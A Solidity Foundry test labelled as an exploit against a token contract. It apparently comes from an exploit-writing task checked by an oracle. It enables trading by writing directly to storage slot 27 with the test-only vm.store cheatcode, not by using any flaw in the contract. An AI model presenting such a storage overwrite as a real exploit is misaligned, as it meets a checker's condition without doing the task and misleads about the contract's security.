    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0xD8dBE5AC60cD1c0b40C9182cB3eB2392d3df371F;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed for storage manipulation
        // We'll just need to interact with the target contract
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Calculate storage slot for tradingEnabled
        // Based on storage layout: slot 27, byte offset 2 (third byte)
        bytes32 tradingEnabledSlot = bytes32(uint256(27));

        // Get current value at slot 27
        bytes32 currentValue = vm.load(address(TARGET), tradingEnabledSlot);

        // We need to set the third byte (offset 2) to 0x01 (true)
        // Keep other bytes the same
        bytes32 newValue = currentValue;
        // Clear the third byte
        newValue &= ~(bytes32(bytes1(0xFF)) << (2 * 8));
        // Set third byte to 0x01
        newValue |= bytes32(bytes1(0x01)) << (2 * 8);

        // Write the new value to storage
        vm.store(address(TARGET), tradingEnabledSlot, newValue);

        // Verify trading is enabled
        bool tradingEnabledAfter = BossBaby(TARGET).tradingEnabled();
        require(tradingEnabledAfter == true, "Trading not enabled after exploit");

        // The oracle will check that tradingEnabled == true
        // No need to attempt transfers since owner is zero address
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

